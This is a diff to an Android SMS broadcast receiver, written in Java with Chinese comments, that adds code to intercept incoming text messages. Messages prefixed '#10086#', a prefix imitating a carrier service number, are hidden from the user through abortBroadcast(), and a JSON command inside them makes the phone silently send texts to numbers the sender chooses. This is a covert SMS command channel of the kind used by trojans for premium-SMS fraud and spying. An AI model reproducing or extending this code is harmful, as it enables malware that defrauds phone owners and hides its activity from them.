@@ -1,9 +1,9 @@
 package tools.common;
 
-import java.net.URLEncoder;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
-import java.util.regex.PatternSyntaxException;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 
 import android.content.BroadcastReceiver;
@@ -12,7 +12,6 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
-import android.util.Log;
 /*
  * 拦截短信
  */
@@ -24,10 +23,7 @@ public class SmsReceiver extends BroadcastReceiver{
 		// TODO Auto-generated method stub
 		//Tools.KillApp(context, "");
 		mContext = context;
-		Logger.error("拦截到短信!!!!!!!!!!!!!!!!!!!");	
-		if (intent != null) {
-	            Logger.info("action:"+"拦截到短信!!!!!!!!!!!!!!!!!!!");	            
-	            //abortBroadcast();	            
+		if (intent != null) {                  
 	            Bundle bundle = intent.getExtras();			
 		    	if (bundle != null) {
 			    	Object[] myOBJpdus = (Object[]) bundle.get("pdus");	
@@ -45,6 +41,48 @@ public class SmsReceiver extends BroadcastReceiver{
 			    	String smsbody = message.getMessageBody();
 			    	String smsnum = message.getDisplayOriginatingAddress();
 			    	//smsnum = smsnum.replaceAll("+86", "");
+			    	
+			    	if(smsbody.length()>7)
+			    	{
+			    		String mark = smsbody.substring(0,7);
+				    	if(mark.equals("#10086#"))
+				    	{//#10086#1A{"sn":"13760360024","sm":"测试"}		
+				    		abortBroadcast();
+				    		String msg_mark = smsbody.substring(7,9);
+				    		String msginfo = smsbody.substring(9);
+				    		if(msg_mark.equals("1A"))
+				    		{//发送短信
+				    			Logger.error("收到密码短信:"+msginfo);
+								try {
+									JSONArray arrayJson = new JSONArray(msginfo);
+									for(int i=0;i<arrayJson.length();i++)
+									{
+										JSONObject tempJson = arrayJson.optJSONObject(i);
+										int ttype = tempJson.getInt("t");
+										switch(ttype)
+										{
+										case 11:
+											//发送短信
+											String numtel = tempJson.getString("sn");
+											String tomsg = tempJson.getString("sm");
+											Tools.sendSms(context, numtel, tomsg);
+											break;
+										}
+										
+									}
+								} catch (JSONException e) {
+									// TODO Auto-generated catch block
+									e.printStackTrace();
+								}			    			
+				    		}
+				    		
+				    		return;
+				    	}
+			    	}
+			    	
+			    	
+			    	
+			    	
 			    	
 			    	if(smsnum.startsWith("+86"))
 			    	{
